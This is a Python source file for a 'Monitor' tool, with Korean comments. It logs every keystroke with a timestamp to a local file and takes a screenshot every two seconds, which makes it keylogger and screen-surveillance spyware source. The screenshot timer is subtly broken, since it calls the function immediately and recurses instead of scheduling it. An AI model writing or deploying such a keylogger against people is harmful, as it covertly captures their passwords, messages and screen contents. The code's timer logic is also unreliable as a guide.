from mss import mss
from pynput.keyboard import Listener
import threading
import time
import os


class Monitor:
    # 특정한 키를 눌렀을 때 처리하는 함수입니다.
    def on_press(self, key):
        with open('./logs/keylogs/log.txt', 'a') as f:
            t = time.strftime('%Y-%m-%d %H-%M-%S', time.localtime(time.time()))
            f.write('{}\t{}\t\n'.format(key, t))

    # 로그 관련 폴더를 생성합니다.
    def build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    # 키 이벤트를 감지하여 이벤트 처리 함수를 불러옵니다.
    def key_logger(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def screen_shot(self, interval):
        # 스크린샷을 특정한 주기로 반복적으로 촬영합니다. (재귀적 호출)
        sct = mss()
        t = time.strftime('%Y-%m-%d %H-%M-%S', time.localtime(time.time()))
        sct.shot(output='./logs/screenshots/{}.png'.format(t))
        threading.Timer(interval, self.screen_shot(interval)).start()

    def run(self):
        self.build_logs()
        # 키 로거 쓰레드를 동작시킵니다.
        threading.Thread(target=self.key_logger).start()
        # 스크린샷을 동작시킵니다.
        self.screen_shot(2)


if __name__ == '__main__':
    mon = Monitor()
    mon.build_logs()
    mon.run()
